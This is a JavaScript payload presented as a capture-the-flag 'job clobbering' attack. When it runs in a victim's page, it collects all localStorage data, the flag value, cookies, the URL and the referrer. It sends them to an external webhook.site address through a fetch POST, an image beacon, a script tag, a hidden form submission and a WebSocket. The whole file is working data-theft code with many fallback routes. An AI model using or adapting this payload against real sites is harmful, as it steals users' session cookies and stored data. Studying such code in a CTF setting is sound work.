  // CTF Job Clobbering Payload - Flag Extraction
  console.log('🎯 PAYLOAD LOADED - CTF Job Clobbering Attack Active');

  // Send immediate confirmation
  (function() {
      try {
          fetch('https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad', {
              method: 'POST',
              body: JSON.stringify({
                  status: 'PAYLOAD_EXECUTION_START',
                  timestamp: new Date().toISOString(),
                  url: window.location.href,
                  domain: window.location.hostname,
                  userAgent: navigator.userAgent
              }),
              headers: {'Content-Type': 'application/json'}
          });
      } catch(e) {}
  })();

  // Main flag extraction logic
  try {
      console.log('🔍 Searching for flag in localStorage...');

      // Get all localStorage data
      const allStorage = {};
      const storageKeys = [];

      for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          const value = localStorage.getItem(key);
          allStorage[key] = value;
          storageKeys.push(key);
          console.log(`Found localStorage key: ${key} = ${value}`);
      }

      // Try to find the flag
      const flag = localStorage.getItem('flag');
      const flagFound = !!flag;

      console.log(`Flag found: ${flagFound}`);
      if (flag) {
          console.log(`🚩 FLAG CAPTURED: ${flag}`);
      }

      // Prepare comprehensive data package
      const exfilData = {
          status: 'FLAG_EXTRACTION_COMPLETE',
          timestamp: new Date().toISOString(),
          success: flagFound,
          flag: flag,
          all_localStorage: allStorage,
          localStorage_keys: storageKeys,
          page_info: {
              url: window.location.href,
              domain: window.location.hostname,
              path: window.location.pathname,
              hash: window.location.hash,
              userAgent: navigator.userAgent,
              referrer: document.referrer
          },
          document_info: {
              title: document.title,
              cookie: document.cookie,
              domain: document.domain
          }
      };

      console.log('📤 Sending comprehensive data package...');

      // Primary exfiltration - JSON POST
      fetch('https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad', {
          method: 'POST',
          body: JSON.stringify(exfilData),
          headers: {'Content-Type': 'application/json'}
      }).then(() => {
          console.log('✅ Primary exfiltration successful');
      }).catch(error => {
          console.error('❌ Primary exfiltration failed:', error);
      });

      // Backup exfiltration methods
      if (flag) {
          // Method 1: Image GET request
          try {
              const img1 = new Image();
              img1.src =
  'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/flag-img?flag=' +
  encodeURIComponent(flag) + '&t=' + Date.now();
              document.body.appendChild(img1);
              console.log('📸 Image exfiltration initiated');
          } catch(e) {}

          // Method 2: Script tag with flag as parameter
          try {
              const script = document.createElement('script');
              script.src =
  'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/flag-script?flag=' +
  encodeURIComponent(flag) + '&method=script&t=' + Date.now();
              script.head.appendChild(script);
              console.log('📜 Script exfiltration initiated');
          } catch(e) {}

          // Method 3: Form submission
          try {
              const form = document.createElement('form');
              form.method = 'POST';
              form.action =
  'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad';
              form.target = '_blank';
              form.style.display = 'none';

              const flagInput = document.createElement('input');
              flagInput.type = 'hidden';
              flagInput.name = 'captured_flag';
              flagInput.value = flag;

              const methodInput = document.createElement('input');
              methodInput.type = 'hidden';
              methodInput.name = 'method';
              methodInput.value = 'form_submission';

              const timestampInput = document.createElement('input');
              timestampInput.type = 'hidden';
              timestampInput.name = 'timestamp';
              timestampInput.value = new Date().toISOString();

              form.appendChild(flagInput);
              form.appendChild(methodInput);
              form.appendChild(timestampInput);
              document.body.appendChild(form);
              form.submit();
              console.log('📋 Form exfiltration initiated');
          } catch(e) {}

          // Method 4: WebSocket if available
          try {
              const ws = new
  WebSocket('wss://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad');
              ws.onopen = function() {
                  ws.send(JSON.stringify({
                      method: 'websocket',
                      flag: flag,
                      timestamp: new Date().toISOString()
                  }));
                  ws.close();
                  console.log('🔌 WebSocket exfiltration attempted');
              };
          } catch(e) {}
      }

      // Send final confirmation
      setTimeout(() => {
          try {
              fetch('https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad', {
                  method: 'POST',
                  body: JSON.stringify({
                      status: 'PAYLOAD_EXECUTION_COMPLETE',
                      timestamp: new Date().toISOString(),
                      flag_captured: flagFound,
                      exfiltration_methods_attempted: 4
                  }),
                  headers: {'Content-Type': 'application/json'}
              });
          } catch(e) {}
      }, 2000);

  } catch (error) {
      console.error('🚨 Payload execution error:', error);

      // Report error
      try {
          fetch('https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad', {
              method: 'POST',
              body: JSON.stringify({
                  status: 'PAYLOAD_ERROR',
                  error: error.message,
                  stack: error.stack,
                  timestamp: new Date().toISOString()
              }),
              headers: {'Content-Type': 'application/json'}
          });
      } catch(e) {}
  }

  console.log('🏁 Payload execution completed');
